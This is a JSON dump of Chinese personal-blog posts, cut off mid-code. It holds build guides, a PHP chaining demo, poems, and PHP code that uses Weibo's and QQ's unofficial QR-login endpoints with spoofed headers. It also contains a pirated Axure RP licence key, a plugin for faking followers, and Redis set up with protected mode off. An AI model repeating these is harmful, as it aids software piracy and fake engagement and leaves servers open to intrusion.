","date":"2019-08-28T00:12:00Z","permalink":"https://blog.aaayun.cc/archives/423.html","title":"宝塔nginx环境下php7.2无mcrypt扩展"},{"content":"loader.io最大支持10000个连接，一个主域名，每次测试时最多同时可以对两个页面进行测试，每次测试时间限制为1分钟。使用前需要注册一个loader.io账号。\n截图\nloader.io也支持定时执行测试任务和使用loader.io提供的API来调用测试任务。\n网站地址：https://loader.io\nPS:loader.io会把测试报告发送到您的注册邮箱！\n","date":"2019-08-27T19:36:00Z","permalink":"https://blog.aaayun.cc/archives/421.html","title":"在线免费测试网站压力"},{"content":"因为无聊用苹果cms做了个视频采集站点 里面的各大影视都可以免费观看 已经稳定运行两个月了\n注:视频资源来源于互联网，本平台只是做收集处理，如侵犯了您的版权请联系我们删除\n邮箱:admin@aaayun.cc\n轻风云影视\n","date":"2019-08-27T09:00:00Z","permalink":"https://blog.aaayun.cc/archives/420.html","title":"轻风云影视"},{"content":"原先的centos7中安装的gcc编译器为4.8.5，版本太旧，执行一些程序完全不够用阿 比如 网易云音乐等\n所以今天博主带你升级gcc9.2.0最新版\n1.安装编译环境\n1 # yum install -y gcc bzip2 glibc-headers gcc-c++ 2.查看当前gcc版本\n1 2 3 4 5 6 7 8 # gcc -v 使用内建 specs。 COLLECT_GCC=gcc COLLECT_LTO_WRAPPER=/usr/libexec/gcc/x86_64-redhat-linux/4.8.5/lto-wrapper 目标：x86_64-redhat-linux 配置为：../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-bootstrap --enable-shared --enable-threads=posix --enable-checking=release --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-linker-build-id --with-linker-hash-style=gnu --enable-languages=c,c++,objc,obj-c++,java,fortran,ada,go,lto --enable-plugin --enable-initfini-array --disable-libgcj --with-isl=/builddir/build/BUILD/gcc-4.8.5-20150702/obj-x86_64-redhat-linux/isl-install --with-cloog=/builddir/build/BUILD/gcc-4.8.5-20150702/obj-x86_64-redhat-linux/cloog-install --enable-gnu-indirect-function --with-tune=generic --with-arch_32=x86-64 --build=x86_64-redhat-linux 线程模型：posix gcc 版本 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC) 3.获取安装包并解压\n1 2 3 # cd /usr/local # wget https://ftp.gnu.org/gnu/gcc/gcc-9.2.0/gcc-9.2.0.tar.gz # tar -xvf gcc-9.2.0.tar.gz 4.进入解压后的gcc文件夹，下载供编译需求的依赖项\n1 2 # cd gcc-9.2.0 # ./contrib/download_prerequisites 5.建立一个文件夹存放编译文件\n1 # mkdir build \u0026amp;\u0026amp; cd build 6.生成 Makefile 文件并且安装（此过程极为漫长）\n1 2 # ../configure --enable-bootstrap --enable-checking=release --enable-languages=c,c++ --disable-multilib # make \u0026amp;\u0026amp; make install 7.设置为默认编译器\n1 2 # export PATH=/usr/local/gcc-9.2.0/bin:$PATH # vim ~/.bashrc (最后一行加入 export PATH=/usr/local/gcc-9.2.0/bin:$PATH ) 8.查找编译gcc时生成的最新动态库\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 # gcc -v 使用内建 specs。 COLLECT_GCC=gcc COLLECT_LTO_WRAPPER=/usr/libexec/gcc/x86_64-redhat-linux/4.8.5/lto-wrapper 目标：x86_64-redhat-linux 配置为：../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-bootstrap --enable-shared --enable-threads=posix --enable-checking=release --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-linker-build-id --with-linker-hash-style=gnu --enable-languages=c,c++,objc,obj-c++,java,fortran,ada,go,lto --enable-plugin --enable-initfini-array --disable-libgcj --with-isl=/builddir/build/BUILD/gcc-4.8.5-20150702/obj-x86_64-redhat-linux/isl-install --with-cloog=/builddir/build/BUILD/gcc-4.8.5-20150702/obj-x86_64-redhat-linux/cloog-install --enable-gnu-indirect-function --with-tune=generic --with-arch_32=x86-64 --build=x86_64-redhat-linux 线程模型：posix gcc 版本 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC) [root@ay build]# find / -name \u0026#34;libstdc++.so*\u0026#34; find: ‘/run/user/1000/gvfs’: 权限不够 /var/lib/flatpak/runtime/com.deepin.wine.Platform/i386/2.18.1/4733a106047bcb12e32c60a47370d9d7288aca3a80f28e0da9f71f5497bfec98/files/lib/i386-linux-gnu/libstdc++.so.6 /var/lib/flatpak/runtime/com.deepin.wine.Platform/i386/2.18.1/4733a106047bcb12e32c60a47370d9d7288aca3a80f28e0da9f71f5497bfec98/files/lib/i386-linux-gnu/libstdc++.so.6.0.25 /var/lib/flatpak/runtime/com.deepin.wine.Platform/i386/2.18.1/4733a106047bcb12e32c60a47370d9d7288aca3a80f28e0da9f71f5497bfec98/files/lib/i386-linux-gnu/libstdc++.so.6.0.25-gdb.py find: ‘/tmp/.mount_jetbraDGRolG’: 权限不够 /usr/lib/gcc/x86_64-redhat-linux/4.8.2/32/libstdc++.so /usr/lib/gcc/x86_64-redhat-linux/4.8.2/libstdc++.so /usr/lib/libstdc++.so.6 /usr/lib/libstdc++.so.6.0.19 /usr/lib64/libstdc++.so.6.0.19 /usr/lib64/libstdc++.so.6.bak /usr/lib64/libstdc++.so.6.0.27 /usr/lib64/libstdc++.so.6 /usr/share/gdb/auto-load/usr/lib64/libstdc++.so.6.0.19-gdb.py /usr/share/gdb/auto-load/usr/lib64/libstdc++.so.6.0.19-gdb.pyc /usr/share/gdb/auto-load/usr/lib64/libstdc++.so.6.0.19-gdb.pyo /usr/share/gdb/auto-load/usr/lib/libstdc++.so.6.0.19-gdb.py /usr/share/gdb/auto-load/usr/lib/libstdc++.so.6.0.19-gdb.pyc /usr/share/gdb/auto-load/usr/lib/libstdc++.so.6.0.19-gdb.pyo /usr/local/gcc-9.2.0/build/stage1-x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.27 /usr/local/gcc-9.2.0/build/stage1-x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6 /usr/local/gcc-9.2.0/build/stage1-x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so /usr/local/gcc-9.2.0/build/x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.27 /usr/local/gcc-9.2.0/build/x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6 /usr/local/gcc-9.2.0/build/x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so /usr/local/gcc-9.2.0/build/prev-x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.27 /usr/local/gcc-9.2.0/build/prev-x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6 /usr/local/gcc-9.2.0/build/prev-x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so /usr/local/gcc-9.2.0/lib64/libstdc++.so.6.0.27 /usr/local/gcc-9.2.0/lib64/libstdc++.so.6 /usr/local/gcc-9.2.0/lib64/libstdc++.so /usr/local/gcc-9.2.0/lib64/libstdc++.so.6.0.27-gdb.py 9.将找到的动态库libstdc++.so.6.0.27复制到/usr/lib64\n1 # cp /usr/local/gcc-9.2.0/build/stage1-x86_64-pc-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.27 /usr/lib64 10.切换工作目录至/usr/lib64，删除原来的软连接， 将默认库的软连接指向最新动态库。\n1 2 3 # cd /usr/lib64 # rm -rf libstdc++.so.6 # ln -s libstdc++.so.6.0.27 libstdc++.so.6 11.验证\n1 2 3 4 5 6 7 8 # gcc -v 使用内建 specs。 COLLECT_GCC=gcc COLLECT_LTO_WRAPPER=/usr/local/gcc-9.2.0/libexec/gcc/x86_64-pc-linux-gnu/9.2.0/lto-wrapper 目标：x86_64-pc-linux-gnu 配置为：../configure --prefix=/usr/local/gcc-9.2.0/ --enable-checking=release --enable-languages=c,c++ --disable-multilib 线程模型：posix gcc 版本 9.2.0 (GCC) 到此完成gcc9.2的安装\n","date":"2019-08-19T17:46:00Z","permalink":"https://blog.aaayun.cc/archives/419.html","title":"centos7编译安装gcc9.2"},{"content":"之前博主在江苏凯博公司(又称蜂鸟传媒)做过后端开发\n四月十号去面试，十二号工作的，因为有急事所以在七月十七号晚辞职了，那天正好完成了cms管理框架。\n之后领导也同意了我辞职的事，并说余下的工资下个月十号结清，说了抱歉便走了\n等到八月十号没有发工资，于是便等了两天问\n工资不想发就直说，何必找这种不切实际的借口，代码看不懂？公司phper全死了吗\n由于一些原因，只展示博主写的框架\n[项目地址][1]\n[1]: https://github.com/Anderyly/AYPHP\n","date":"2019-08-17T04:10:00Z","permalink":"https://blog.aaayun.cc/archives/415.html","title":"揭露一个恶心的公司"},{"content":"男孩患了疾病\n医生说活不了多久了\n女孩听到这句话时\n心凉了\n眼看着男孩躺着病床上\n一天天的虚弱\n女孩真的很难过\n很伤心 很绝望\n终于\n男孩的主治医师\n找到了需要移植的心脏\n女孩笑了 男孩父母笑了\n因为男孩不用去另一个世界了\n出乎意料的是\n男孩不同意移植\n态度异常的坚定\n男孩的父母和女孩一直追问\n男孩只是摇摇头\n就算死亡 我也不换\n男孩的父母想不通\n女孩更想不通\n他们一直劝男孩\n男孩还是死活不肯\n终于……\n在一天的阳光明媚的凌晨\n男孩离开了这个世界\n女孩哭了\n同时女孩也恨男孩\n为什么丢弃她\n为什么不要她了\n为什么！\n没有人能回复女孩\n当女孩去了男孩病床边\n收拾他的东西时\n在日记本上看到了这样一句话\n用别人的心爱你\n我做不到\n","date":"2019-07-30T06:45:00Z","permalink":"https://blog.aaayun.cc/archives/413.html","title":"病"},{"content":"因整改内容暂无\n","date":"2019-07-25T01:57:00Z","permalink":"https://blog.aaayun.cc/archives/408.html","title":"v2ray一键安装"},{"content":"Axure RP是美国Axure Software Solution公司旗舰产品，是一个专业的快速原型设计工具，让负责定义需求和规格、设计功能和界面的专家能够快速创建应用软件或Web网站的线框图、流程图、原型和规格说明文档。作为专业的原型设计工具，它能快速、高效的创建原型，同时支持多人协作设计和版本控制管理\nLicence:\nKoshy key:\nwTADPqxn3KChzJxLmUr5jTTitCgsfRkftQQ1yIG9HmK83MYSm7GPxLREGn+Ii6xY ","date":"2019-07-23T19:50:00Z","permalink":"https://blog.aaayun.cc/archives/407.html","title":"Axure RP 8 最新注册码"},{"content":" 环境介绍 CentOS7 (未安装Development Tools)\n下载Redis5.0-rc3 1 wget -O redis-5.0-rc3.tar.gz https://github.com/antirez/redis/archive/5.0-rc3.tar.gz 解压redis 1 tar -zxvf redis-5.0-rc3.tar.gz -C /usr/local 编译并安装 1 2 cd /usr/local/redis-5.0-rc3 make 此时会出错：\n1 2 3 4 compilation terminated. make[1]: *** [adlist.o] Error 1 make[1]: Leaving directory `/usr/local/redis-5.0-rc3/src\u0026#39; make: *** [all] Error 2 安装Development Tools\n1 yum groupinstall \u0026#39;Development Tools\u0026#39; 再次执行，还会报错\n1 2 3 4 5 6 7 8 9 10 11 12 make cd src \u0026amp;\u0026amp; make all make[1]: Entering directory `/usr/local/redis-5.0-rc3/src\u0026#39; CC adlist.o In file included from adlist.c:34:0: zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory #include \u0026lt;jemalloc/jemalloc.h\u0026gt; ^ compilation terminated. make[1]: *** [adlist.o] Error 1 make[1]: Leaving directory `/usr/local/redis-5.0-rc3/src\u0026#39; make: *** [all] Error 2 最后解决方案如下：\n1 cd /usr/local/redis-5.0-rc3/deps; make hiredis lua jemalloc linenoise 编译完成后再次在/usr/local/redis-5.0-rc3中执行make命令\n1 2 cd /usr/local/redis-5.0-rc3 make 出现如下即编译成功\n1 2 Hint: It\u0026#39;s a good idea to run \u0026#39;make test\u0026#39; ? make[1]: Leaving directory `/usr/local/redis-5.0-rc3/src\u0026#39; 然后在/usr/local/redis-5.0-rc3/src中执行安装命令：\n1 2 cd /usr/local/redis-5.0-rc3/src make install 会出现如下日志信息\n1 2 3 4 5 6 7 Hint: It\u0026#39;s a good idea to run \u0026#39;make test\u0026#39; ? INSTALL install INSTALL install INSTALL install INSTALL install INSTALL install 修改redis.conf配置文件 1 vim /usr/local/redis-5.0-rc3/redis.conf 只需要调整如下几个即可\n1 2 protected-mode no # 关闭保护模式 daemonize yes # 守护进程模式开启 启动redis5.0 1 /usr/local/redis-5.0-rc3/src/redis-server /usr/local/redis-5.0-rc3/redis.conf 其实我们在执行make install的时候会将src下面的几个命令复制到/usr/local/bin/下面去，也可以执行如下命令启动redis5.0\n1 /usr/local/bin/redis-server /usr/local/redis-5.0-rc3/redis.conf 检查端口\n1 netstat -ltnp |grep 6379 如果有端口监听，说明redis已经启动成功。\n连接下试试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 redis-cli 127.0.0.1:6379\u0026gt; info # Server redis_version:4.9.103 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:207f31cf830c081e redis_mode:standalone os:Linux 3.10.0-693.17.1.el7.x86_64 x86_64 arch_bits:64 multiplexing_api:epoll atomicvar_api:atomic-builtin gcc_version:4.8.5 process_id:20361 run_id:4835668974ad86f1db9b3c8b98e02be1a87a7b9b tcp_port:6379 uptime_in_seconds:689 uptime_in_days:0 hz:10 lru_clock:3944003 为什么能在任意目录执行redis-cli命令呢，因为redis-cli命令在/usr/local/bin目录里面，而该目录又配置在PATH中，所以你可以向执行ls、mkdir等命令的方式去执行redis-cli或者redis-server等命令。\n一般我们在安装完redis后就会将其安装包给删除，那么我们只需要将redis.conf配置文件移动的其他目录，比如：/etc/redis/redis.conf中，具体位置在哪请按照自己的习惯或者规范放置即可。\n","date":"2019-07-11T19:36:00Z","permalink":"https://blog.aaayun.cc/archives/401.html","title":"CentOS7中编译安装redis5.0"},{"content":"n含套个人简历模板，自荐信模板，面试技巧等等就不一一截图了，各种风格任你挑选，总用一款适合你\n链接:[地址] 提取码:ienj\n","date":"2019-07-08T09:26:00Z","permalink":"https://blog.aaayun.cc/archives/400.html","title":"某宝购买的简历模板"},{"content":"应客户需求写了一个直播采集插件\n功能主要就是采集各平台直播入自己库并生成僵尸粉\n下载链接在下方\n云豹直播主播采集插件.zip\n","date":"2019-07-03T08:58:00Z","permalink":"https://blog.aaayun.cc/archives/397.html","title":"2019最新云豹直播采集(各大平台)"},{"content":"想必大家都用过tp的Db类吧,连贯操作是不是很酷\n实现很简单不需要用到__call方法\n简单分析一下tp框架的Db类\n1 Db::name(\u0026#39;user\u0026#39;)-\u0026gt;where(\u0026#39;id\u0026#39;, 1)-\u0026gt;find() 以上这行代码 首先调用name方法不过是静态的最后返回当前对象继续调用其他方法\n重点:结束时是return当前对象,静态方法使用 return new self() 返回,非静态使用 return $this;\n下面举一个小例子:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php /** * @author anderyly * @email anderyly@sina.com * @link https://blog.aaayun.cc * @copyright Copyright (c) 2019 */ namespace ay; class Test { public static $name; public static function set($name) { self::$name = $name; return new self(); } public function add() { self::$name = \u0026#34;an\u0026#34; . self::$name; return $this; } public function get() { return self::$name; } } 调用Test类\n1 2 3 $name = Test::set(\u0026#39;deryly\u0026#39;)-\u0026gt;add()-\u0026gt;get(); echo $name; // 输出 anderyly ","date":"2019-06-30T00:31:00Z","permalink":"https://blog.aaayun.cc/archives/393.html","title":"PHP实现无顺序连贯操作"},{"content":"我也想谈恋爱，可我不想再分手了\n17岁失恋了\n可以躲在厕所里哭\n可以在ktv喝酒唱通宵\n可以哭得昏天暗地\n可以发誓以后和他老死不相往来\n然后重新开始\n像没有受过伤一样\n22岁失恋了\n一夜未眠 一夜游荡\n第二天却还要假装没事\n因为你还要工作\n还要生活\n你面无表情\n可你知道你心里已经塌了\n25岁\n你想过无数次\n要不索性回到十七岁\n再轰轰烈烈的爱一次\n可是你清楚的知道\n你已经老得不能再失恋一次了\n第一次恋爱\n心里住了梅花鹿\n连看他一眼都小鹿乱撞\n后来心里生了一条蛇\n一有人靠近就摇起尾巴\n告诉别人你很危险更没有耐心\n也曾小鹿乱撞，后来撞死了。\n我也想谈恋爱，可我不想再分手了。\n经常有人问我\n为什么不谈恋爱\n其实我也想谈恋爱啊\n只是我再也不想分手了\n其实身边也不缺追求者\n只是每次想答应的时候\n都会胆怯 害怕\n然后习惯性的拒绝\n爱一个人的成本太高了\n要耗上大把时间和精力\n还不一定会有回报\n大概是件稳赔不赚的事\n所以怕了吧\n两个人在一起很简单\n相互喜欢就好\n但是分开\n却要耗尽毕生的精力\n你花了大把的时间和精力去习惯了解一个人\n最后却还是要分开\n真的很累\n我好不容易从上一段感情中活过来，不想再送死了。\n我知道，我们都到了害怕失恋的年纪。\n有人说\n爱情是属于那些即使灰心失望\n却仍继续期待的人\n是属于那些被出卖欺骗\n却仍坚信美好的人\n是属于那些纵然伤痕累累\n却仍渴求爱的人\n而不是我们抱着\n我已经老得不能再失恋一次\n这种糟糕心态的人\n可是\n我真的没有精力再失恋一次了\n要么不开始\n要么一辈子\n我不想再分手了\n我想找个人一直一直在一起\n我不用你有多完美\n我只希望我们能永远不分开\n我想谈一场不分手的恋爱\n我再也不想分手了。\n","date":"2019-06-13T08:43:56Z","permalink":"https://blog.aaayun.cc/archives/390.html","title":"十七岁与二十五岁的不同"},{"content":"余之一生，最幸，莫过于汝\n总角十九载，于花开之时，共结秦晋之缘\n执笔而添灯，剑舞而酒温\n天长之言，行书以鉴\n余之一生，最悔，亦汝\n少而轻狂，自矜学才不浅\n当一搏权贵世位，以治汝之疾痛\n琼月下，曰：三载而归\n","date":"2019-05-18T19:24:00Z","permalink":"https://blog.aaayun.cc/archives/389.html","title":"幸"},{"content":"用到官方的两个接口,一个是获取图片地址以及qrid，一个是用qrid验证二维码状态\n获取新浪登入二维码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public function getqrpic() { $url = \u0026#34;https://login.sina.com.cn/sso/qrcode/image?entry=weibo\u0026amp;size=180\u0026amp;callback=STK_\u0026#34; . $this-\u0026gt;getTime(); $header = [ \u0026#39;Accept:\u0026#39; =\u0026gt; \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Encoding:\u0026#39; =\u0026gt; \u0026#39;gzip, deflate, br\u0026#39;, \u0026#39;Accept-Language:\u0026#39; =\u0026gt; \u0026#39;en-US,en;q=0.9\u0026#39;, \u0026#39;Connection:\u0026#39; =\u0026gt; \u0026#39;keep-alive\u0026#39;, \u0026#39;Cookie:\u0026#39; =\u0026gt; \u0026#39;mm_lang=en; mm_lang=en\u0026#39;, \u0026#39;Host:\u0026#39; =\u0026gt; \u0026#39;login.wx.qq.com\u0026#39;, \u0026#39;Referer:\u0026#39; =\u0026gt; \u0026#39;https://wx.qq.com/\u0026#39;, \u0026#39;User-Agent:\u0026#39; =\u0026gt; \u0026#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\u0026#39; ]; $res = Curl::url($url)-\u0026gt;setHeader($header)-\u0026gt;get(); $regex = \u0026#34;#window(.*?)\\(#\u0026#34;; $resArr = json_decode(rtrim(rtrim(preg_replace($regex, \u0026#34;\u0026#34;, $res), \u0026#39;;\u0026#39;), \u0026#39;)\u0026#39;), true); // echo ltrim($resArr[\u0026#39;data\u0026#39;][\u0026#39;image\u0026#39;], \u0026#39;//\u0026#39;); if ($resArr[\u0026#39;retcode\u0026#39;] == 20000000) { Json::msg(0, \u0026#39;success\u0026#39;, [\u0026#39;qrid\u0026#39; =\u0026gt; $resArr[\u0026#39;data\u0026#39;][\u0026#39;qrid\u0026#39;], \u0026#39;image\u0026#39; =\u0026gt; \u0026#39;https://\u0026#39; . ltrim($resArr[\u0026#39;data\u0026#39;][\u0026#39;image\u0026#39;], \u0026#39;//\u0026#39;)]); } else { Json::msg(1, \u0026#39;二维码获取失败\u0026#39;); } } 利用返回的qrid验证二维码状态\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 public function cron() { if (input(\u0026#39;?get.qrid\u0026#39;)) { $qrid = input(\u0026#39;get.qrid\u0026#39;); } else { Json::msg(400, \u0026#39;qrid不能为空\u0026#39;); } $url = \u0026#34;https://login.sina.com.cn/sso/qrcode/check?entry=weibo\u0026amp;qrid=\u0026#34; . $qrid . \u0026#34;\u0026amp;callback=STK_\u0026#34; . $this-\u0026gt;getTime(); // echo $url;exit; $header = [ \u0026#39;Accept:\u0026#39; =\u0026gt; \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Encoding:\u0026#39; =\u0026gt; \u0026#39;gzip, deflate, br\u0026#39;, \u0026#39;Accept-Language:\u0026#39; =\u0026gt; \u0026#39;en-US,en;q=0.9\u0026#39;, \u0026#39;Connection:\u0026#39; =\u0026gt; \u0026#39;keep-alive\u0026#39;, \u0026#39;Cookie:\u0026#39; =\u0026gt; \u0026#39;mm_lang=en; mm_lang=en\u0026#39;, \u0026#39;Host:\u0026#39; =\u0026gt; \u0026#39;login.wx.qq.com\u0026#39;, \u0026#39;Referer:\u0026#39; =\u0026gt; \u0026#39;https://wx.qq.com/\u0026#39;, \u0026#39;User-Agent:\u0026#39; =\u0026gt; \u0026#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\u0026#39; ]; $res = Curl::url($url)-\u0026gt;setHeader($header)-\u0026gt;get(); $regex = \u0026#34;#window(.*?)\\(#\u0026#34;; $resArr = json_decode(rtrim(rtrim(preg_replace($regex, \u0026#34;\u0026#34;, $res), \u0026#39;;\u0026#39;), \u0026#39;)\u0026#39;), true); if($resArr[\u0026#39;retcode\u0026#39;] == 50114003){ Json::msg(205, \u0026#39;二维码已失效\u0026#39;); } elseif($resArr[\u0026#39;retcode\u0026#39;] == 50114001) { Json::msg(202, \u0026#39;二维码未失效\u0026#39;); } elseif($resArr[\u0026#39;retcode\u0026#39;] == 50114002) { Json::msg(204, \u0026#39;正在验证二维码\u0026#39;); } elseif ($resArr[\u0026#39;retcode\u0026#39;] == 50114004) { Json::msg(204, \u0026#39;该二维码已登录，请重新扫描\u0026#39;); } elseif ($resArr[\u0026#39;retcode\u0026#39;] == 20000000) { //Json::msg(200, \u0026#39;sucess\u0026#39;, $resArr); preg_match(\u0026#34;/-(.*?)-/\u0026#34;, $resArr[\u0026#39;data\u0026#39;][\u0026#39;alt\u0026#39;], $ts_arr); $wb = base64_decode($ts_arr[1]); // 这里写成功后的操作 // 扫码成功后会返回一个固定的base64，利用这个值登入吧 $this-\u0026gt;reg($wb); } else{ Json::msg(306, $res); } } 附getTime方法，此方法获取13位时间戳\n1 2 3 4 private function getTime() { $arr = explode(\u0026#39;.\u0026#39;, microtime(true)); return (float)($arr[0] . substr($arr[1], 0 , 3)); } 前端代码博主就不贴了，定时器罢了\n示例网站:http://www.chinawenshu.com\n","date":"2019-04-22T23:09:00Z","permalink":"https://blog.aaayun.cc/archives/380.html","title":"PHP实现微博登入(非开放平台)"},{"content":"近期有个需求，需要做扫码登入，而又不想去开放平台申请，看了一下彩虹大神的提取qq的sid，提取了几个重要的方法\n原理就是生成二维码后，前端设置定时器查看二维码状态，因为没有openid只能保存固定的值，那就是qq号了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 // 生成二维码 public function getqrpic() { $url = \u0026#39;https://ssl.ptlogin2.qq.com/ptqrshow?appid=1006102\u0026amp;e=2\u0026amp;l=M\u0026amp;s=4\u0026amp;d=72\u0026amp;v=4\u0026amp;t=0.5409099\u0026#39; . time() . \u0026#39;daid=1\u0026amp;pt_3rd_aid=0\u0026#39;; $arr = $this-\u0026gt;get_curl($url, 0, 0, 0, 1, 0, 0, 1); preg_match(\u0026#39;/qrsig=(.*?);/\u0026#39;, $arr[\u0026#39;header\u0026#39;], $match); if ($qrsig = $match[1]) { Json::msg(0, \u0026#39;success\u0026#39;, [\u0026#39;qrsig\u0026#39; =\u0026gt; $qrsig, \u0026#39;data\u0026#39; =\u0026gt; base64_encode($arr[\u0026#39;body\u0026#39;])]); } else { Json::msg(1, \u0026#39;二维码获取失败\u0026#39;); } } // 获取二维码状态 public function qqlogin() { error_reporting(0); if (input(\u0026#39;?get.qrsig\u0026#39;)) { $qrsig = input(\u0026#39;get.qrsig\u0026#39;); } else { Json::msg(400, \u0026#39;qrsig不能为空\u0026#39;); } $sig = \u0026#39;\u0026#39;; $url = \u0026#39;https://ssl.ptlogin2.qq.com/ptqrlogin?u1=https%3A%2F%2Fid.qq.com%2Findex.html\u0026amp;ptqrtoken=\u0026#39; . $this-\u0026gt;getqrtoken($qrsig) . \u0026#39;\u0026amp;ptredirect=1\u0026amp;h=1\u0026amp;t=1\u0026amp;g=1\u0026amp;from_ui=1\u0026amp;ptlang=2052\u0026amp;action=0-0-\u0026#39; . time() . \u0026#39;0000\u0026amp;js_ver=10291\u0026amp;js_type=1\u0026amp;login_sig=\u0026#39; . $sig . \u0026#39;\u0026amp;pt_uistyle=40\u0026amp;aid=1006102\u0026amp;daid=1\u0026amp;\u0026#39;; $ret = $this-\u0026gt;get_curl($url, 0, $url, \u0026#39;qrsig=\u0026#39; . $qrsig . \u0026#39;; \u0026#39;, 1); preg_match(\u0026#34;/ptuiCB\\(\u0026#39;(.*?)\u0026#39;\\)/\u0026#34;, $ret, $ts_arr); $r = @explode(\u0026#34;\u0026#39;,\u0026#39;\u0026#34;, str_replace(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, \u0026#34;\u0026#39;,\u0026#39;\u0026#34;, $ts_arr[1])); if ($r[0] == 65) { Json::msg(205, \u0026#39;二维码已失效\u0026#39;); } elseif ($r[0] == 66) { Json::msg(202, \u0026#39;二维码未失效\u0026#39;); } elseif ($r[0] == 67) { Json::msg(204, \u0026#39;正在验证二维码\u0026#39;); } else { if (strpos($ret, \u0026#39;403\u0026#39;)) Json::msg(306, $ret); } if (strlen($ret) \u0026gt; 1000) { $arr = explode(\u0026#39;;\u0026#39;, $ret); $data = substr($arr[17], strpos($arr[17], \u0026#39;=o\u0026#39;) + 2, strlen($arr[17])); if (empty($data)) { Json::msg(400, \u0026#39;请切换二维码\u0026#39; . $ret); } $qq = ltrim($data, \u0026#39;0\u0026#39;); // $qq是qq号，下面写你接下来需要处理的语句 } } private function get_curl($url, $post = 0, $referer = 0, $cookie = 0, $header = 0, $ua = 0, $nobaody = 0, $split = 0) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); $httpheader[] = \u0026#34;Accept:*/*\u0026#34;; $httpheader[] = \u0026#34;Accept-Encoding:gzip,deflate,sdch\u0026#34;; $httpheader[] = \u0026#34;Accept-Language:zh-CN,zh;q=0.8\u0026#34;; $httpheader[] = \u0026#34;Connection:close\u0026#34;; curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader); if ($post) { curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post); } if ($header) { curl_setopt($ch, CURLOPT_HEADER, TRUE); } if ($cookie) { curl_setopt($ch, CURLOPT_COOKIE, $cookie); } if ($referer) { curl_setopt($ch, CURLOPT_REFERER, $referer); } if ($ua) { curl_setopt($ch, CURLOPT_USERAGENT, $ua); } else { curl_setopt($ch, CURLOPT_USERAGENT, \u0026#39;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36\u0026#39;); } if ($nobaody) { curl_setopt($ch, CURLOPT_NOBODY, 1); } curl_setopt($ch, CURLOPT_ENCODING, \u0026#34;gzip\u0026#34;); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $ret = curl_exec($ch); if ($split) { $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE); $header = substr($ret, 0, $headerSize); $body = substr($ret, $headerSize); $ret = array(); $ret[\u0026#39;header\u0026#39;] = $header; $ret[\u0026#39;body\u0026#39;] = $body; } curl_close($ch); return $ret; } 前端js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 getqrpic(); function getqrpic() { var getvcurl = \u0026#34;qlogin/getqrpic/r/\u0026#34; + Math.random(1); $.get(getvcurl, function (res) { console.log(res.info.qrsig) if (res.status == 0) { $(\u0026#39;#qrimg\u0026#39;).attr(\u0026#39;qrsig\u0026#39;, res.info.qrsig); $(\u0026#39;#qrimg\u0026#39;).html(\u0026#39;\u0026lt;img onclick=\u0026#34;getqrpic()\u0026#34; src=\u0026#34;data:image/png;base64,\u0026#39; + res.info.data + \u0026#39;\u0026#34; title=\u0026#34;点击刷新\u0026#34;\u0026gt;\u0026#39;); } else { //alert(res.msg); } }, \u0026#39;json\u0026#39;); } $(document).ready(function(){ interval1=setInterval(getMsg,2000); }); function getMsg() { var qrsig=$(\u0026#39;#qrimg\u0026#39;).attr(\u0026#39;qrsig\u0026#39;); var getvcurl = \u0026#34;qlogin/qqlogin/qrsig/\u0026#34; + decodeURIComponent(qrsig) + 